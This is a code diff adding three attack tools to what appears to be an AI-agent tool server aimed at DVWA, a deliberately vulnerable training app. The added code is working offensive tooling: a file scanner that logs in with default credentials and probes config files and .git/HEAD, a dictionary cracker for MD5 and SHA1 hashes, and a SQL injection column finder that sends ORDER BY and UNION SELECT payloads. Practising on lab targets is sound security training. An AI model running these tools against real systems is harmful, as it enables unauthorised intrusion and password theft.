@@ -13,6 +13,7 @@ Each tool follows a standard pattern that you can replicate:
 from typing import Any, Awaitable, Callable, Dict, List, Optional
 from pydantic import BaseModel, Field
 import json
+import hashlib
 import asyncio
 import ipaddress
 import re
@@ -709,6 +710,7 @@ DVWA_BRUTE_FORCE_TOOL = ToolDefinition(
     },
 )
 
+
 DVWA_AUTH_BYPASS_TOOL = ToolDefinition(
     name="dvwa_auth_bypass_check",
     description="Check whether the setup page is accessible without authentication.",
@@ -716,6 +718,192 @@ DVWA_AUTH_BYPASS_TOOL = ToolDefinition(
         "type": "object",
         "properties": {
             "base_url": {"type": "string"},
+        },
+        "required": ["base_url"],
+    },
+)
+
+
+async def dvwa_recon_scan(base_url: str) -> Dict[str, Any]:
+    def _run() -> Dict[str, Any]:
+        session = _create_session(base_url)
+        # Try to login first to see more files
+        _perform_login(session, base_url, "admin", "password")
+        
+        # List of interesting files to check
+        possible_files = [
+            "login.php",
+            "index.php",
+            "config/config.inc.php",
+            "includes/dvwa.inc.php",
+            "includes/database.inc.php",
+            "database.php",
+            "phpinfo.php",
+            "robots.txt",
+            ".git/HEAD",
+            "README.md",
+        ]
+        
+        found_files = []
+        for file_path in possible_files:
+            try:
+                # Use _request_with_params but for specific paths
+                # We need to construct the full URL carefully
+                target_url = f"{base_url.rstrip('/')}/{file_path.lstrip('/')}"
+                resp = session.get(target_url, timeout=5)
+                if resp.status_code == 200:
+                    found_files.append({
+                        "path": file_path,
+                        "status": resp.status_code,
+                        "size": len(resp.text)
+                    })
+            except Exception:
+                pass
+                
+        return {
+            "success": True,
+            "found_files": found_files,
+            "scan_count": len(possible_files)
+        }
+
+    return await asyncio.to_thread(_run)
+
+
+async def dvwa_hash_cracker(hash_to_crack: str) -> Dict[str, Any]:
+    def _run() -> Dict[str, Any]:
+        # Common passwords dictionary
+        common_passwords = [
+            'password', 'password123', '123456', '12345', '1234567890',
+            'admin', 'root', 'toor', 'test', 'guest', 'qwerty',
+            'monkey', 'letmein', 'abc123', 'shadow', 'sunshine',
+            'batman', 'dragon', 'master', 'hello', 'world',
+            'welcome', 'login', 'pass', 'passwd', 'secret',
+            'admin123', 'password1', '123123', '111111', 
+            'admin123456', 'qwertyuiop', 'monkey123', 'charlie', '1337'
+        ]
+        
+        target_hash = hash_to_crack.lower().strip()
+        
+        for password in common_passwords:
+            # Try MD5
+            if hashlib.md5(password.encode()).hexdigest() == target_hash:
+                return {
+                    "success": True,
+                    "algorithm": "md5",
+                    "password": password,
+                    "hash": target_hash
+                }
+            # Try SHA1
+            if hashlib.sha1(password.encode()).hexdigest() == target_hash:
+                return {
+                    "success": True,
+                    "algorithm": "sha1",
+                    "password": password,
+                    "hash": target_hash
+                }
+                
+        return {
+            "success": False,
+            "message": "Hash not found in dictionary"
+        }
+
+    return await asyncio.to_thread(_run)
+
+
+async def dvwa_sqli_column_finder(
+    base_url: str,
+    injection_point: str = "id",
+    method: str = "ORDER_BY"
+) -> Dict[str, Any]:
+    def _run() -> Dict[str, Any]:
+        session = _create_session(base_url)
+        # Ensure we're logged in
+        _perform_login(session, base_url, "admin", "password")
+        
+        max_columns = 10
+        found_columns = 0
+        
+        if method.upper() == "ORDER_BY":
+            # Binary search or linear increment for ORDER BY
+            for i in range(1, max_columns + 1):
+                payload = f"' ORDER BY {i} #"
+                # Inject into the ID parameter as it's the most common in DVWA
+                params = {"id": payload, "Submit": "Submit"}
+                try:
+                    resp = session.get(f"{base_url}/vulnerabilities/sqli/", params=params)
+                    # DVWA returns "Unknown column" or generic error on failure
+                    # But often it just returns a blank page or specific error
+                    # In DVWA, a successful ORDER BY shows the user ID exists or no error
+                    # A failed one usually shows a database error if errors are on
+                    
+                    # Heuristic: If response size is significantly different or contains error
+                    if "Unknown column" in resp.text or "SQL syntax" in resp.text:
+                        found_columns = i - 1
+                        break
+                    found_columns = i
+                except Exception:
+                    break
+        
+        elif method.upper() == "UNION":
+            # Try UNION SELECT 1, 2, ...
+            for i in range(1, max_columns + 1):
+                # Try with -- comment which is more standard than #
+                nulls = ",".join(["1"] * i)
+                payload = f"' UNION SELECT {nulls} -- "
+                params = {"id": payload, "Submit": "Submit"}
+                try:
+                    resp = session.get(f"{base_url}/vulnerabilities/sqli/", params=params)
+                    # If we see the numbers reflected, we found it
+                    # DVWA reflects the First Name and Surname
+                    # So if we see our numbers, it worked
+                    if "First name: 1" in resp.text or "Surname: 1" in resp.text:
+                        found_columns = i
+                        break
+                except Exception:
+                    pass
+                    
+        return {
+            "success": found_columns > 0,
+            "column_count": found_columns,
+            "method": method
+        }
+
+    return await asyncio.to_thread(_run)
+
+
+DVWA_RECON_TOOL = ToolDefinition(
+    name="dvwa_recon_scan",
+    description="Scan DVWA for interesting files and endpoints.",
+    inputSchema={
+        "type": "object",
+        "properties": {
+            "base_url": {"type": "string"},
+        },
+        "required": ["base_url"],
+    },
+)
+
+DVWA_HASH_CRACKER_TOOL = ToolDefinition(
+    name="dvwa_hash_cracker",
+    description="Attempt to crack a hash using a dictionary attack.",
+    inputSchema={
+        "type": "object",
+        "properties": {
+            "hash_to_crack": {"type": "string"},
+        },
+        "required": ["hash_to_crack"],
+    },
+)
+
+DVWA_SQLI_COLUMN_TOOL = ToolDefinition(
+    name="dvwa_sqli_column_finder",
+    description="Find the number of columns in a SQL injection point.",
+    inputSchema={
+        "type": "object",
+        "properties": {
+            "base_url": {"type": "string"},
+            "injection_point": {"type": "string", "description": "Not used currently, defaults to ID param"},
+            "method": {"type": "string", "enum": ["ORDER_BY", "UNION"], "default": "UNION"},
         },
         "required": ["base_url"],
     },
@@ -741,6 +929,9 @@ AVAILABLE_TOOLS += [
     DVWA_FILE_INCLUSION_TOOL,
     DVWA_BRUTE_FORCE_TOOL,
     DVWA_AUTH_BYPASS_TOOL,
+    DVWA_RECON_TOOL,
+    DVWA_HASH_CRACKER_TOOL,
+    DVWA_SQLI_COLUMN_TOOL,
 ]
 
 
@@ -762,6 +953,9 @@ TOOL_IMPLEMENTATIONS.update(
         "dvwa_file_inclusion_fetch": dvwa_file_inclusion_fetch,
         "dvwa_login_bruteforce_check": dvwa_login_bruteforce_check,
         "dvwa_auth_bypass_check": dvwa_auth_bypass_check,
+        "dvwa_recon_scan": dvwa_recon_scan,
+        "dvwa_hash_cracker": dvwa_hash_cracker,
+        "dvwa_sqli_column_finder": dvwa_sqli_column_finder,
     }
 )
 
